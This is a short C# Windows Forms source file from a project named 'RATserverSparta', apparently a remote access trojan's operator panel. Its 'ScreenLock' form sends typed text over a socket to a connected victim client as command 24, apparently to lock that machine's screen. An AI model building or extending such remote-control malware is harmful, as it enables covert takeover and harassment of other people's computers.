using RATserverSparta.Client;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta.Tools.Screen
{
    public partial class ScreenLock : Form
    {
        private Socket SocketClient;
        public ScreenLock(Socket SocketClient)
        {
            InitializeComponent();
            this.SocketClient = SocketClient;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SocketSend Data = new SocketSend(this.SocketClient);
            Data.Send(Encoding.ASCII.GetBytes(textBox1.Text), 24);
        }
    }
}
